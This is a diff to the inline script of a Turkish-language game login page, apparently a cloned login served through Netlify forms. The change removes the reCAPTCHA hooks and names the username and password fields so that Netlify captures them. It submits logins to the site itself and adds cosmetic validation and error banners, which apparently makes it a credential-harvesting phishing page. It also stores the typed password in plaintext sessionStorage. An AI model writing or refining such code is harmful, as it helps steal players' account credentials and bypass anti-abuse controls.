@@ -181,9 +181,13 @@ function onSubmit(token) {
 
 
 
+
 <!-- BEGIN: Validation + banner additions -->
 <script>
+// SO_VALIDATION v2
 (function () {
+  var KEY = 'so_last';
+
   function $(sel, root){ return (root||document).querySelector(sel); }
   function createBanner(form) {
     var existing = document.getElementById('so-error-banner');
@@ -197,149 +201,139 @@ function onSubmit(token) {
       + '  <p class="font-bold text-red-600">Oops</p>'
       + '  <p id="so-error-text" class="text-sm text-red-00"></p>'
       + '</div>';
-    form.parentNode.insertBefore(wrap, form);
     return wrap;
   }
+  function ensureBannerPlaced(form) {
+    var b = document.getElementById('so-error-banner');
+    if (!b) {
+      b = createBanner(form);
+      form.parentNode.insertBefore(b, form);
+    }
+    return b;
+  }
   function setBanner(msg, form){
-    var banner = createBanner(form);
+    var b = ensureBannerPlaced(form);
     var p = document.getElementById('so-error-text');
     if (p) p.textContent = msg;
-    banner.style.display = '';
+    b.style.display = '';
   }
   function hideBanner(){
-    var banner = document.getElementById('so-error-banner');
-    if (banner) banner.style.display = 'none';
+    var b = document.getElementById('so-error-banner');
+    if (b) b.style.display = 'none';
   }
   function getForm(){
-    return document.getElementById('biscolab-recaptcha-invisible-form') ||
-           document.getElementById('login') ||
-           document.querySelector('form');
+    // Be flexible: prefer data-netlify form; otherwise first form
+    return document.querySelector('form[data-netlify]') || document.querySelector('form');
   }
   function getInputs(form){
-    var u = form.querySelector('input[name="username"], input#username, input[placeholder*="yuncu"], input[placeholder*="Oyuncu"]');
+    var u = form.querySelector('input[name="username"], #username, input[placeholder*="yuncu"], input[placeholder*="Oyuncu"]');
     var p = form.querySelector('input[type="password"]');
     return {u: u, p: p};
   }
   function validate(form){
     var ip = getInputs(form);
-    if (!ip.u || !ip.p) return 'ok'; // no fields found
+    if (!ip.u || !ip.p) return 'ok';
     var username = (ip.u.value || '').trim();
     var password = ip.p.value || '';
 
-    if (username === '' || password === '') {
-      return 'empty';
-    }
-    if (username.length < 3 || username.length > 16 || password.length < 6) {
-      return 'wrong';
-    }
+    if (username === '' || password === '') return 'empty';
+    if (username.length < 3 || username.length > 16 || password.length < 6) return 'wrong';
     return 'ok';
+  }
+  function saveState(result, form){
+    try {
+      var ip = getInputs(form);
+      sessionStorage.setItem(KEY, JSON.stringify({
+        e: result,
+        username: ip.u ? ip.u.value : '',
+        password: ip.p ? ip.p.value : ''
+      }));
+    } catch(_) {}
+  }
+  function readAndShow(){
+    try {
+      var raw = sessionStorage.getItem(KEY);
+      if (!raw) return;
+      sessionStorage.removeItem(KEY);
+      var data = JSON.parse(raw || '{}');
+      var form = getForm();
+      if (!form) return;
+      var ip = getInputs(form);
+      if (ip.u && typeof data.username === 'string') ip.u.value = data.username;
+      if (ip.p && (data.e === 'wrong' || data.e === 'empty')) {
+        if (typeof data.password === 'string') ip.p.value = data.password;
+      }
+      if (data.e === 'empty') {
+        setBanner('Boş alan bırakmamalısın.', form);
+      } else if (data.e === 'wrong') {
+        setBanner('Girdiğin oyuncu adı veya şifre yanlış. Ama hangisi söylemem.', form);
+      }
+    } catch(_) {}
   }
 
   document.addEventListener('DOMContentLoaded', function(){
     var form = getForm();
-    // Disable reCAPTCHA binding (badge can remain)
-    try {
-      var recBtn0 = document.querySelector('.g-recaptcha');
-      if (recBtn0) { recBtn0.classList.remove('g-recaptcha'); recBtn0.removeAttribute('data-callback'); }
-    } catch(_) {}
+    if (!form) return;
 
-        // Intercept clicks on the reCAPTCHA submit button BEFORE Google handles it
-    var submitBtn = form.querySelector('button.g-recaptcha, .g-recaptcha, button[type="submit"], input[type="submit"]');
-    if (submitBtn) {
-      submitBtn.addEventListener('click', function(e){
-        var result = validate(form);
-        if (result === 'empty' || result === 'wrong') {
-          // Save and redirect without triggering reCAPTCHA
-          var ip = getInputs(form);
-          try {
-            sessionStorage.setItem('so_last', JSON.stringify({
-              e: result,
-              username: ip.u ? ip.u.value : '',
-              password: ip.p ? ip.p.value : ''
-            }));
-          } catch(_) {}
-          e.preventDefault();
-          e.stopImmediatePropagation();
-          window.location.replace('/');
-          return false;
-        }
-      }, true); // capture phase to beat reCAPTCHA
+    // Ensure username has name attr (for Netlify) and we can repopulate reliably
+    var ip = getInputs(form);
+    if (ip.u && !ip.u.name) ip.u.setAttribute('name', 'username');
+    if (ip.p && !ip.p.name) ip.p.setAttribute('name', 'password');
+
+    // Prevent reCAPTCHA: remove g-recaptcha class/attrs from the visible button
+    var btn = form.querySelector('#g-recaptcha-btn, .g-recaptcha, button[type="submit"], input[type="submit"]');
+    if (btn) {
+      btn.classList.remove('g-recaptcha');
+      btn.removeAttribute('data-sitekey');
+      btn.removeAttribute('data-callback');
+      btn.removeAttribute('data-size');
     }
 
-    // Intercept Enter key submits when invalid
-    form.addEventListener('keydown', function(e){
-      if (e.key === 'Enter' && !e.shiftKey && !e.ctrlKey) {
-        var result = validate(form);
-        if (result === 'empty' || result === 'wrong') {
-          var ip = getInputs(form);
-          try {
-            sessionStorage.setItem('so_last', JSON.stringify({
-              e: result,
-              username: ip.u ? ip.u.value : '',
-              password: ip.p ? ip.p.value : ''
-            }));
-          } catch(_) {}
-          e.preventDefault();
-          e.stopImmediatePropagation();
-          window.location.replace('/');
-          return false;
-        }
-      }
-    }, true);
-// Prefer custom validation before any other handlers (including reCAPTCHA)
-    // Pre-submit blocking removed; we'll show errors after POST
-    // 3) Intercept form submit
-    form.addEventListener('submit', function(e){
-      var result = validate(form);
-      var ip = getInputs(form);
-      try {
-        sessionStorage.setItem('so_last', JSON.stringify({
-          e: result,
-          username: ip.u ? ip.u.value : '',
-          password: ip.p ? ip.p.value : ''
-        }));
-      } catch(_) {}
-
-      if (result === 'empty' || result === 'wrong') {
-        // As a safety net, also block here (in case click listener didn't fire)
+    // Intercept clicks before Google handlers; we will manually submit if valid
+    form.addEventListener('click', function(e){
+      var target = e.target;
+      if (!(target.closest && target.closest('#g-recaptcha-btn, .g-recaptcha, button[type="submit"], input[type="submit"]'))) return;
+      var res = validate(form);
+      if (res === 'empty' || res === 'wrong') {
+        saveState(res, form);
         e.preventDefault();
+        e.stopImmediatePropagation();
+        // Go to same page; banner will be shown from storage
         window.location.replace('/');
         return false;
+      } else {
+        // Valid: submit form without reCAPTCHA
+        e.preventDefault();
+        e.stopImmediatePropagation();
+        // Make sure action goes to "/"
+        if (!form.getAttribute('action')) form.setAttribute('action', '/');
+        form.submit();
       }
-      // VALID -> allow default submit (reCAPTCHA + Netlify)
     }, true);
 
-    // After load, read ?e=... and show banner accordingly
-    (function(){
-      try {
-        var raw = sessionStorage.getItem('so_last');
-        if (!raw) return;
-        sessionStorage.removeItem('so_last');
-        var data = JSON.parse(raw || '{}');
-        var form = getForm();
-    // Disable reCAPTCHA binding (badge can remain)
-    try {
-      var recBtn0 = document.querySelector('.g-recaptcha');
-      if (recBtn0) { recBtn0.classList.remove('g-recaptcha'); recBtn0.removeAttribute('data-callback'); }
-    } catch(_) {}
+    // Enter key handling
+    form.addEventListener('keydown', function(e){
+      if (e.key !== 'Enter' || e.shiftKey || e.ctrlKey) return;
+      var res = validate(form);
+      if (res === 'empty' || res === 'wrong') {
+        saveState(res, form);
+        e.preventDefault();
+        e.stopImmediatePropagation();
+        window.location.replace('/');
+      } else {
+        e.preventDefault();
+        e.stopImmediatePropagation();
+        if (!form.getAttribute('action')) form.setAttribute('action', '/');
+        form.submit();
+      }
+    }, true);
 
-        if (!form) return;
-        var ip = getInputs(form);
-        if (ip.u && typeof data.username === 'string') ip.u.value = data.username;
-        // Repopulate password only if the previous attempt was "wrong" due to length OR empty,
-        // otherwise leave blank for safety.
-        if (ip.p && (data.e === 'wrong' || data.e === 'empty')) {
-          if (typeof data.password === 'string') ip.p.value = data.password;
-        }
-        if (data.e === 'empty') {
-          setBanner('Boş alan bırakmamalısın.', form);
-        } else if (data.e === 'wrong') {
-          setBanner('Girdiğin oyuncu adı veya şifre yanlış. Ama hangisi söylemem.', form);
-        }
-      } catch(_) {}
-    })();
-    }); // end DOMContentLoaded
-})();</script>
+    // After POST/redirect: show banner + repopulate
+    readAndShow();
+  });
+})();
+</script>
 <!-- END: Validation + banner additions -->
+
 
 </body></html>
